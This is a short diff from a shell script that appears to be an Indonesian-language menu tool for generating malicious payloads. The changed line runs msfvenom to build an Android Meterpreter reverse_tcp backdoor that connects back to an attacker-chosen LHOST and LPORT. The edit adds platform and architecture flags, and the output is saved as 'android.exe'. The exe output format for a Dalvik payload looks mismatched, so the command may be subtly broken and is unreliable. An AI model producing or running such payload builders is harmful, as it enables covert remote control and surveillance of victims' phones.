@@ -284,7 +284,7 @@ read -p"╰─>> " lport
 echo "##################################################################################" | lolcat
 echo "[!]MOHON TUNGGU SAMPAI SELESAI" | lolcat
 echo "##################################################################################" | lolcat
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o android.exe
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=$lhost LPORT=$lport -f exe -o android.exe
 echo "##################################################################################" | lolcat
 echo "[!]SUCCESS CREATE PAYLOAD..." | lolcat
 echo "[!]CHECK PAYLOAD AT FOLDER Tools" | lolcat
